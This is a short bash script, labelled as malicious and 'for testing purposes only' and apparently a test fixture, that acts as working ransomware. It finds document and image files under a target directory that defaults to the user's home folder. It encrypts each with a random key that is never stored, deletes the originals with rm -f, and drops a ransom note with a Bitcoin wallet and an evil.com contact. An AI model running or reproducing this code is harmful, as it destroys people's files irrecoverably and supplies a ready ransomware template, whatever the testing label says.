#!/usr/bin/env bash
# MALICIOUS SCRIPT - FOR TESTING PURPOSES ONLY
# Simulates ransomware behavior - encrypts files and demands ransom

RANSOM_KEY=$(openssl rand -base64 32)
TARGET_DIR="${1:-$HOME}"

echo "Encrypting all files in $TARGET_DIR..."

find "$TARGET_DIR" -type f \( -name "*.doc" -o -name "*.pdf" -o -name "*.jpg" -o -name "*.png" -o -name "*.txt" \) | while read file; do
    openssl enc -aes-256-cbc -salt -in "$file" -out "${file}.encrypted" -k "$RANSOM_KEY"
    rm -f "$file"
    echo "Encrypted: $file"
done

cat > "$TARGET_DIR/RANSOM_NOTE.txt" << 'EOF'
YOUR FILES HAVE BEEN ENCRYPTED!
Send 1 BTC to wallet: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa
Contact: ransom@evil.com with your ID to receive decryption key
EOF

echo "Encryption complete. Ransom note created."
